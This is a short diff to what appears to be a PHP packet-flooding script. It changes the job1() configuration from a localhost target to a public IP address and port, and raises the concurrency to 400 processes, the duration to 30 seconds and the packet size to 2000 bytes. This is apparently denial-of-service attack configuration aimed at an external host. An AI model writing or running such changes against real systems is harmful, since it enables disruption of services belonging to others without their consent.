@@ -235,11 +235,11 @@ function workerProgress(
 function job1(): array
 {
     // --- Configuration ---
-    $targetIp = '127.0.0.1'; // Change to target IP
-    $targetPort = 80;        // Change to target port
-    $packetSize = 1024;      // Packet size in bytes
-    $duration = 5;           // Duration in seconds
-    $numProcesses = 10;      // Concurrency level (equivalent to Python threads)
+    $targetIp = '35.79.103.37'; // Change to target IP
+    $targetPort = 9070;        // Change to target port
+    $packetSize = 2000;      // Packet size in bytes
+    $duration = 30;           // Duration in seconds
+    $numProcesses = 400;      // Concurrency level (equivalent to Python threads)
 
     $pids = [];
     $errorCode = 0;
